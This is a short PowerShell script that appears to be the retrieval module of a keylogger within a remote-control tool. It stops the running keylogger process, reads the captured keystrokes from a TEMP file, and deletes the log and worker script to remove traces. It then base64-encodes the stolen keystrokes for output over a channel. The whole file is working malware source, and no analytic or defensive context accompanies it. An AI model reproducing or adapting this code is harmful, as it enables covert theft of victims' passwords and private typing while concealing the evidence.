param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
$workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"

if (Test-Path $pidFile) {
    $pidRunning = Get-Content $pidFile
    try {
        Stop-Process -Id $pidRunning -Force -ErrorAction SilentlyContinue
    } catch {
        # Ignore
    }
    Remove-Item $pidFile -Force
}

Start-Sleep -Seconds 1

if (Test-Path $logFile) {
    $content = Get-Content $logFile -Raw
    Remove-Item $logFile -Force
    Remove-Item $workerScript -Force -ErrorAction SilentlyContinue
    if ($content) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        [System.Convert]::ToBase64String($bytes)
    } else {
        "No keystrokes recorded."
    }
} else {
    "Keylogger not running."
}